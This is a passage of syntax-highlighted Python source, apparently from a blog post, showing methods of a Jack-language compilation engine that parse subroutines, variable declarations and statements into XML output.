class="line"></span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(str(sys._getframe().f_lineno) + <span class="string">"invalid subroutine!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse body</span></span><br><span class="line">        self.compileSubroutineBody()</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/subroutineDec&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileSubroutineBody</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;subroutineBody&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid sub routine body define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var </span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"var"</span>:</span><br><span class="line">            self.compileVarDec()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid sub routine body define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/subroutineBody&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileParameterList</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;parameterList&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse rest param</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span>\</span><br><span class="line">            self.parser.symbol() == <span class="string">")"</span>):</span><br><span class="line">            <span class="comment"># parse first element type</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER <span class="keyword">or</span> \</span><br><span class="line">               (self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">               (self.parser.keyWord() == <span class="string">"int"</span> <span class="keyword">or</span> self.parser.keyWord() == <span class="string">"char"</span> <span class="keyword">or</span> \</span><br><span class="line">                self.parser.keyWord() == <span class="string">"boolean"</span>)):</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse first element varName</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse ','</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL:</span><br><span class="line">                <span class="keyword">if</span> self.parser.symbol() == <span class="string">","</span>:</span><br><span class="line">                    self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                    self.parser.advance()</span><br><span class="line">                <span class="keyword">elif</span> self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">                    <span class="keyword">break</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    print(str(sys._getframe().f_lineno) + <span class="string">"valid param list!\n"</span>)</span><br><span class="line">                    exit(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(str(sys._getframe().f_lineno) + <span class="string">"valid param list!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/parameterList&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileVarDec</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;varDec&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse key word</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"var"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var type</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">or</span> \</span><br><span class="line">           self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse var name</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse the rest var name</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">";"</span>):</span><br><span class="line">            <span class="comment"># parse ","</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> self.parser.symbol() == <span class="string">","</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse var name</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid val define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line">            </span><br><span class="line">        <span class="comment"># parse the end symbol  </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">";"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid var define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># end of class var descrtion</span></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/varDec&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileStatements</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;statements&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">             (self.parser.keyWord() == <span class="string">"do"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"if"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"while"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"let"</span> <span class="keyword">or</span> \</span><br><span class="line">              self.parser.keyWord() == <span class="string">"return"</span>):</span><br><span class="line">            <span class="keyword">if</span> self.parser.keyWord() == <span class="string">"do"</span>:</span><br><span class="line">                self.compileDo()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"if"</span>:</span><br><span class="line">                self.compileIf()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"while"</span>:</span><br><span class="line">                self.compileWhile()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"let"</span>:</span><br><span class="line">                self.compileLet()</span><br><span class="line">            <span class="keyword">elif</span> self.parser.keyWord() == <span class="string">"return"</span>:</span><br><span class="line">                self.compileReturn()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid statement define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/statements&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span> </span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileDo</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;doStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse do</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"do"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"("</span>):</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.currToken())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do statement  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression list</span></span><br><span class="line">        self.compileExpressionList()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do statement body define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  ';'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid do statement  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/doStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileLet</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;letStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse let </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"let"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse varname</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_IDENTIFIER:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.identifier())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse `[expression]`</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">              self.parser.symbol() == <span class="string">'['</span>:</span><br><span class="line">            <span class="comment"># parse '['</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse expression</span></span><br><span class="line">            self.compileExpression()</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse ']'</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">               self.parser.symbol() == <span class="string">']'</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  '='</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'='</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  ';'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid let  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/letStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileWhile</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;whileStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"while"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'('</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">')'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'&#123;'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse  '&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">'&#125;'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"inValid while  define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/whileStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileReturn</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;returnStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse return </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"return"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if return statement!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse expression  list</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> (self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>):</span><br><span class="line">            self.compileExpression()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse ';'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">';'</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if return statement!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/returnStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileIf</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;ifStatement&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse if </span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"if"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '('</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"("</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse expression</span></span><br><span class="line">        self.compileExpression()</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse ')'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">")"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse '&#123;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse statements</span></span><br><span class="line">        self.compileStatements()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse '&#125;'</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">           self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">            exit(<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="comment"># parse else</span></span><br><span class="line">        <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_KEYWORD <span class="keyword">and</span> \</span><br><span class="line">           self.parser.keyWord() == <span class="string">"else"</span>:</span><br><span class="line">            <span class="comment"># parse 'else'</span></span><br><span class="line">            self.compileOutElement(self.parser.tokenType(),self.parser.keyWord())</span><br><span class="line">            self.parser.advance()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse '&#123;'</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#123;"</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">            <span class="comment"># parse statements</span></span><br><span class="line">            self.compileStatements()</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># parse '&#125;'</span></span><br><span class="line">            <span class="keyword">if</span> self.parser.tokenType() == TOKEN_TYPE.TOKEN_SYMBOL <span class="keyword">and</span> \</span><br><span class="line">            self.parser.symbol() == <span class="string">"&#125;"</span>:</span><br><span class="line">                self.compileOutElement(self.parser.tokenType(),self.parser.symbol())</span><br><span class="line">                self.parser.advance()</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                print(<span class="string">"valid if define!\n"</span>)</span><br><span class="line">                exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">        self.upperLevel()</span><br><span class="line">        self.compileOut(<span class="string">"&lt;/ifStatement&gt;\n"</span>)</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">compileExpression</span><span class="params">(self)</span>:</span></span><br><span class="line">        self.compileOut(<span class="string">"&lt;expression&gt;\n"</span>)</span><br><span class="line">        self.lowerLevel()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse term</span></span><br><span class="line">        self.compileTerm()</span><br><span class="line"></span><br><span class="line">        <span class="comment"># parse op</span></span><br><span class="line">        <span class="keyword">while</span> self.parser.tokenType() == 